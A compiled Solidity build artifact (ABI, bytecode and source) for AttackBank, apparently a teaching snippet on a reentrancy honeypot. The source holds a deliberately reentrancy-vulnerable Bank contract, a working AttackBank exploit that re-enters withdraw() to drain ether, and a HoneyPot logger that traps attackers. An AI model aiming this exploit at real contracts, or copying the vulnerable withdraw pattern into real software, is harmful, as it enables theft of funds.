{
  "contractName": "AttackBank",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Bank",
          "name": "_bank",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610458380380610458833981810160405281019061003291906100ed565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061011a565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b60006100ba8261009d565b9050919050565b6100ca816100af565b81146100d557600080fd5b50565b6000815190506100e7816100c1565b92915050565b60006020828403121561010357610102610078565b5b6000610111848285016100d8565b91505092915050565b61032f806101296000396000f3fe60806040526004361061002d5760003560e01c806312065fe01461010a5780639e5faafc146101355761002e565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101085760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016100d591906102b4565b600060405180830381600087803b1580156100ef57600080fd5b505af1158015610103573d6000803e3d6000fd5b505050505b005b34801561011657600080fd5b5061011f61013f565b60405161012c91906102de565b60405180910390f35b61013d610147565b005b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101b757600080fd5b505af11580156101cb573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161023191906102b4565b600060405180830381600087803b15801561024b57600080fd5b505af115801561025f573d6000803e3d6000fd5b50505050565b6000819050919050565b6000819050919050565b6000819050919050565b600061029e61029961029484610265565b610279565b61026f565b9050919050565b6102ae81610283565b82525050565b60006020820190506102c960008301846102a5565b92915050565b6102d88161026f565b82525050565b60006020820190506102f360008301846102cf565b9291505056fea2646970667358221220ff458e331f591f385ee501e4d74c35fa268257dfd58b7d71841ea30675dfa6a064736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract Logger {\n    event Log(address caller, uint amount, string action);\n\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\ncontract Bank {\n    mapping(address => uint) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, \"deposit\");\n    }\n\n    function withdraw(uint _amount) public {\n        require(_amount <= balances[msg.sender], \"insufficient funds\");\n\n        (bool sent, ) = msg.sender.call{value: _amount}(\"\");\n        require(sent, \"failed to send ether\");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, \"withdraw\");\n    }\n}\n\ncontract AttackBank {\n    Bank bank;\n\n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract HoneyPot {\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        if (equal(_action, \"withdraw\")) {\n            revert(\"it's a trap\");\n        }\n    }\n\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}",
  "sourcePath": "/Users/mac/Documents/GitHub/CodeSnippets/Solidity/polygon/contracts/Bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2021-12-25T14:54:40.617Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}